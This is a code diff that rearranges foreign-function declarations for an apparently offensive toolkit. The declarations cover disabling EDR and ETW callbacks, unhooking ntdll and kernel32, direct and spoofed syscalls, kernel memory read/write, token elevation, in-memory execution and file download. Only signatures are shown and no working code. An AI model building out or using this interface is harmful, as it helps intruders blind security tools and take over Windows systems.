@@ -37,6 +37,16 @@ ffi jocky_decrypt_rc4(buf: i8*, size: i32, key: i8*, keylen: i32) -> void;
 
 // ---- Evasion ----
 ffi jocky_unhook_ntdll() -> bool;
+ffi jocky_unhook_kernel32() -> bool;
+ffi jocky_enable_direct_syscalls() -> bool;
+ffi jocky_disable_ob_callbacks() -> bool;
+ffi jocky_disable_minifilter_callbacks() -> bool;
+ffi jocky_disable_wdfilter() -> bool;
+ffi jocky_patch_etw_provider() -> bool;
+ffi jocky_spoof_process_name(new_name: string) -> bool;
+ffi jocky_hide_from_usermode() -> bool;
+ffi jocky_disable_etw(ctx: i8*) -> bool;
+ffi jocky_disable_edr_callbacks(ctx: i8*) -> i32;
 ffi jocky_get_syscall_number(name: string) -> i32;
 ffi jocky_spoof_call(func: i8*, a1: i64, a2: i64, a3: i64, a4: i64) -> i64;
 ffi jocky_spoof_syscall(ssn: i32, a1: i64, a2: i64, a3: i64, a4: i64) -> i64;
@@ -51,8 +61,6 @@ ffi jocky_driver_map_kernel(ctx: i8*, phys_addr: i64, size: i32) -> i8*;
 // ---- Kernel exploit ----
 ffi jocky_kread(ctx: i8*, addr: i64, out: i8*, size: i32) -> bool;
 ffi jocky_kwrite(ctx: i8*, addr: i64, data: i8*, size: i32) -> bool;
-ffi jocky_disable_edr_callbacks(ctx: i8*) -> i32;
-ffi jocky_disable_etw(ctx: i8*) -> bool;
 ffi jocky_elevate_token(ctx: i8*, pid: i32) -> bool;
 
 // ---- In-memory execution ----
@@ -187,16 +195,6 @@ ffi jocky_http_post(url: string, data: i8*, data_size: i32, headers: string) -> 
 ffi jocky_download_file(url: string, dest_path: string) -> bool;
 ffi jocky_compress_data(data: i8*, size: i32) -> i8*;
 ffi jocky_decompress_data(data: i8*, size: i32) -> i8*;
-
-// ---- Advanced Windows EDR evasion ----
-ffi jocky_unhook_kernel32() -> bool;
-ffi jocky_enable_direct_syscalls() -> bool;
-ffi jocky_disable_ob_callbacks() -> bool;
-ffi jocky_disable_minifilter_callbacks() -> bool;
-ffi jocky_disable_wdfilter() -> bool;
-ffi jocky_patch_etw_provider() -> bool;
-ffi jocky_spoof_process_name(new_name: string) -> bool;
-ffi jocky_hide_from_usermode() -> bool;
 
 // ---- Windows Registry Advanced ----
 ffi jocky_registry_enum_keys(hive: i32, path: string) -> [string];
